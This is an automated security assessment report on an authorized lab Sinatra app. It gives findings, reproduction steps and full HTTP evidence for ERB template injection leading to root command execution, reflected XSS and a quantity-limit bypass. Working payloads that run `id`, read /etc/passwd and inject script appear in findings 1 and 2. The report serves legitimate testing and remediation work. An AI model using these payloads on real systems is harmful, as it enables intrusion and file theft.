# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. CRITICAL — rce Unauthenticated Server-Side Template Injection (Ruby ERB) → RCE as root via `sentence` on POST /generate](#finding-1)
    - [2. HIGH — xss-reflected Reflected XSS in POST /generate — sentence parameter](#finding-2)
    - [3. MEDIUM — qty-tampering Quantity limit bypass in POST /generate — number parameter accepts values far exceeding declared max 200](#finding-3)
    - [4. INFO — burp Input returned in response (reflected)](#finding-4)
    - [5. INFO — burp Suspicious input transformation (reflected)](#finding-5)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqz0pupu-qto719` |
| Target | http://target.local:4567/ |
| Started | 2026-06-29T09:31:13.479Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 2 mapped · 2 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 5 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:4567`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

5 finding(s): 1 critical, 1 high, 1 medium, 2 info

## Findings

<a id="finding-1"></a>

### 1. [CRITICAL] [rce] Unauthenticated Server-Side Template Injection (Ruby ERB) → RCE as root via `sentence` on POST /generate

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:4567/

The `sentence` POST parameter on /generate is interpolated directly into the Sinatra ERB template SOURCE and evaluated server-side, not merely emitted as (escaped/unescaped) HTML output. This is Server-Side Template Injection in Ruby ERB and yields full Remote Code Execution. Proofs collected: (1) `<%= 7*7 %>` renders `49` while the literal control string renders verbatim — server-side evaluation. (2) `<%= `id` %>` returns `uid=0(root) gid=0(root) groups=0(root)` — OS command execution as ROOT inside the (containerized) host. (3) `<%= `cat /etc/passwd` %>` returns the full /etc/passwd contents (root:x:0:0:root:/root:/bin/bash ...) — arbitrary file read. (4) `<%= ENV.to_a.to_s %>` dumps the entire process environment (Ruby 3.1.2, RACK_ENV=development). The app is entirely unauthenticated, so any anonymous visitor achieves remote code execution as root. This is a separate, far more severe vulnerability than the previously recorded reflected-XSS on the same parameter: the input reaches the template engine / OS, not just the HTML body. Contributing misconfig: RACK_ENV=development (verbose Sinatra error pages) and the process runs as root.

**Reproduction**

```
Negative control: POST /generate, body `sentence=cat /etc/passwd&number=1` (no ERB tags) → response renders `<p>cat /etc/passwd</p>` literally; does NOT contain `root:x:0:0:` (evidence ev-mqz160ov-13, 1756 bytes). Exploit: POST /generate, body `sentence=<%= `cat /etc/passwd` %>&number=1` (URL-encoded `sentence=%3C%25%3D%20%60cat%20%2Fetc%2Fpasswd%60%20%25%3E&number=1`) → response body contains the full /etc/passwd file starting `root:x:0:0:root:/root:/bin/bash` (evidence ev-mqz1625i-14 and replay ev-mqz163co-15, both 2663 bytes, stable). Escalation already demonstrated: `sentence=<%= `id` %>&number=1` → `uid=0(root) gid=0(root) groups=0(root)`; `sentence=<%= 7*7 %>&number=1` → `49`. Remediation: never construct ERB template source from user input. Render a fixed template and pass `sentence` as a bound local/variable (e.g. `erb :result, locals: {sentence: params[:sentence]}`) with proper HTML escaping; treat all user input as data. Also drop root privileges and set RACK_ENV=production.
```

**Evidence**

- Evidence `ev-mqz160ov-13` — `artifacts/_/ev-mqz160ov-13/`

Request:

```http
POST /generate HTTP/1.1
Host: target.local:4567
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

sentence=cat%20%2Fetc%2Fpasswd&number=1
```

Response:

```http
HTTP/1.1 200
content-length: 1756
content-type: text/html;charset=utf-8
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-xss-protection: 1; mode=block

<!doctype html>
<html lang="en">
  <head> 
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">

    <title>RepeatMePlease</title>
  </head>
  <body> 
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
      <a class="navbar-brand" href="#">RepeatMePlease</a>
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav ml-auto">
          <li class="nav-item">
            <a class="nav-link" href="/">Home</a>
          </li>
        </ul>
      </div>
    </nav>
 
    <div class="container mt-5">
      <div class="row">
        <div class="col-md-6 offset-md-3">
          <div class="card">
            <div class="card-header">
              Generated your sentence for 1 times
            </div>
            <div class="card-body">
              
                <p>cat /etc/passwd</p>
                <hr>
              
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
  </body>
</html>
```

- Evidence `ev-mqz1625i-14` — `artifacts/_/ev-mqz1625i-14/`

Request:

```http
POST /generate HTTP/1.1
Host: target.local:4567
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

sentence=%3C%25%3D%20%60cat%20%2Fetc%2Fpasswd%60%20%25%3E&number=1
```

Response:

```http
HTTP/1.1 200
content-length: 2663
content-type: text/html;charset=utf-8
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-xss-protection: 1; mode=block

<!doctype html>
<html lang="en">
  <head> 
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">

    <title>RepeatMePlease</title>
  </head>
  <body> 
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
      <a class="navbar-brand" href="#">RepeatMePlease</a>
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav ml-auto">
          <li class="nav-item">
            <a class="nav-link" href="/">Home</a>
          </li>
        </ul>
      </div>
    </nav>
 
    <div class="container mt-5">
      <div class="row">
        <div class="col-md-6 offset-md-3">
          <div class="card">
            <div class="card-header">
              Generated your sentence for 1 times
            </div>
            <div class="card-body">
              
                <p>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
</p>
                <hr>
              
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
  </body>
</html>
```

- Evidence `ev-mqz163co-15` — `artifacts/_/ev-mqz163co-15/`

Request:

```http
POST /generate HTTP/1.1
Host: target.local:4567
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

sentence=%3C%25%3D%20%60cat%20%2Fetc%2Fpasswd%60%20%25%3E&number=1
```

Response:

```http
HTTP/1.1 200
content-length: 2663
content-type: text/html;charset=utf-8
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-xss-protection: 1; mode=block

<!doctype html>
<html lang="en">
  <head> 
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">

    <title>RepeatMePlease</title>
  </head>
  <body> 
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
      <a class="navbar-brand" href="#">RepeatMePlease</a>
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav ml-auto">
          <li class="nav-item">
            <a class="nav-link" href="/">Home</a>
          </li>
        </ul>
      </div>
    </nav>
 
    <div class="container mt-5">
      <div class="row">
        <div class="col-md-6 offset-md-3">
          <div class="card">
            <div class="card-header">
              Generated your sentence for 1 times
            </div>
            <div class="card-body">
              
                <p>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
</p>
                <hr>
              
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
  </body>
</html>
```

<a id="finding-2"></a>

### 2. [HIGH] [xss-reflected] Reflected XSS in POST /generate — sentence parameter

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:4567/

The `sentence` parameter is reflected verbatim into the HTML response without any HTML encoding. Injecting `<img src=x onerror=alert(42)>` causes the tag to appear unescaped inside a `<p>` element in the response body, triggering JavaScript execution when the page is loaded in a browser. All HTML special characters pass through unescaped.

**Reproduction**

```
1. POST http://target.local:4567/generate with Content-Type: application/x-www-form-urlencoded and body: sentence=<img src=x onerror=alert(42)>&number=1\n2. Observe the response HTML contains <p><img src=x onerror=alert(42)></p> — the tag is unescaped.\n3. A browser loading this response executes the onerror handler.
```

**Evidence**

- Evidence `ev-mqz0xesa-l` — `artifacts/s-0001/ev-mqz0xesa-l/`

Request:

```http
POST /generate HTTP/1.1
Host: target.local:4567
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

sentence=safe_control_string&number=1
```

Response:

```http
HTTP/1.1 200
content-length: 1760
content-type: text/html;charset=utf-8
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-xss-protection: 1; mode=block

<!doctype html>
<html lang="en">
  <head> 
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">

    <title>RepeatMePlease</title>
  </head>
  <body> 
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
      <a class="navbar-brand" href="#">RepeatMePlease</a>
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav ml-auto">
          <li class="nav-item">
            <a class="nav-link" href="/">Home</a>
          </li>
        </ul>
      </div>
    </nav>
 
    <div class="container mt-5">
      <div class="row">
        <div class="col-md-6 offset-md-3">
          <div class="card">
            <div class="card-header">
              Generated your sentence for 1 times
            </div>
            <div class="card-body">
              
                <p>safe_control_string</p>
                <hr>
              
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
  </body>
</html>
```

- Evidence `ev-mqz0xe38-k` — `artifacts/s-0001/ev-mqz0xe38-k/`

Request:

```http
POST /generate HTTP/1.1
Host: target.local:4567
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

sentence=%3Cimg+src%3Dx+onerror%3Dalert(42)%3E&number=1
```

Response:

```http
HTTP/1.1 200
content-length: 1770
content-type: text/html;charset=utf-8
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-xss-protection: 1; mode=block

<!doctype html>
<html lang="en">
  <head> 
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">

    <title>RepeatMePlease</title>
  </head>
  <body> 
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
      <a class="navbar-brand" href="#">RepeatMePlease</a>
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav ml-auto">
          <li class="nav-item">
            <a class="nav-link" href="/">Home</a>
          </li>
        </ul>
      </div>
    </nav>
 
    <div class="container mt-5">
      <div class="row">
        <div class="col-md-6 offset-md-3">
          <div class="card">
            <div class="card-header">
              Generated your sentence for 1 times
            </div>
            <div class="card-body">
              
                <p><img src=x onerror=alert(42)></p>
                <hr>
              
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
  </body>
</html>
```

- Evidence `ev-mqz0xqgm-m` — `artifacts/s-0001/ev-mqz0xqgm-m/`

Request:

```http
POST /generate HTTP/1.1
Host: target.local:4567
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

sentence=%3Cimg+src%3Dx+onerror%3Dalert(42)%3E&number=1
```

Response:

```http
HTTP/1.1 200
content-length: 1770
content-type: text/html;charset=utf-8
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-xss-protection: 1; mode=block

<!doctype html>
<html lang="en">
  <head> 
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">

    <title>RepeatMePlease</title>
  </head>
  <body> 
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
      <a class="navbar-brand" href="#">RepeatMePlease</a>
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav ml-auto">
          <li class="nav-item">
            <a class="nav-link" href="/">Home</a>
          </li>
        </ul>
      </div>
    </nav>
 
    <div class="container mt-5">
      <div class="row">
        <div class="col-md-6 offset-md-3">
          <div class="card">
            <div class="card-header">
              Generated your sentence for 1 times
            </div>
            <div class="card-body">
              
                <p><img src=x onerror=alert(42)></p>
                <hr>
              
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
  </body>
</html>
```

<a id="finding-3"></a>

### 3. [MEDIUM] [qty-tampering] Quantity limit bypass in POST /generate — number parameter accepts values far exceeding declared max 200

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:4567/

The UI declares a maximum of 200 repetitions, but the server performs no server-side validation. Submitting `number=99999` causes the server to generate and return 99999 repetitions (response body hits the 64 KB capture cap), indicating the constraint is enforced only in the browser. This can be used to force the server to perform unbounded work per request, acting as a DoS amplifier.

**Reproduction**

```
1. POST http://target.local:4567/generate with body: sentence=test&number=99999\n2. Observe the response header says "Generated your sentence for 99999 times" and contains thousands of repeated `<p>test</p>` blocks — well beyond the stated max of 200.
```

**Evidence**

- Evidence `ev-mqz0sopc-6` — `artifacts/s-0001/ev-mqz0sopc-6/`

Request:

```http
POST /generate HTTP/1.1
Host: target.local:4567
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

sentence=test&number=5
```

Response:

```http
HTTP/1.1 200
content-length: 2001
content-type: text/html;charset=utf-8
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-xss-protection: 1; mode=block

<!doctype html>
<html lang="en">
  <head> 
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">

    <title>RepeatMePlease</title>
  </head>
  <body> 
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
      <a class="navbar-brand" href="#">RepeatMePlease</a>
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav ml-auto">
          <li class="nav-item">
            <a class="nav-link" href="/">Home</a>
          </li>
        </ul>
      </div>
    </nav>
 
    <div class="container mt-5">
      <div class="row">
        <div class="col-md-6 offset-md-3">
          <div class="card">
            <div class="card-header">
              Generated your sentence for 5 times
            </div>
            <div class="card-body">
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
  </body>
</html>
```

- Evidence `ev-mqz0sqk3-7` — `artifacts/s-0001/ev-mqz0sqk3-7/`

Request:

```http
POST /generate HTTP/1.1
Host: target.local:4567
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

sentence=test&number=99999
```

Response (truncated):

```http
HTTP/1.1 200
content-length: 6401621
content-type: text/html;charset=utf-8
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-xss-protection: 1; mode=block

<!doctype html>
<html lang="en">
  <head> 
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">

    <title>RepeatMePlease</title>
  </head>
  <body> 
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
      <a class="navbar-brand" href="#">RepeatMePlease</a>
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav ml-auto">
          <li class="nav-item">
            <a class="nav-link" href="/">Home</a>
          </li>
        </ul>
      </div>
    </nav>
 
    <div class="container mt-5">
      <div class="row">
        <div class="col-md-6 offset-md-3">
          <div class="card">
            <div class="card-header">
              Generated your sentence for 99999 times
            </div>
            <div class="card-body">
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
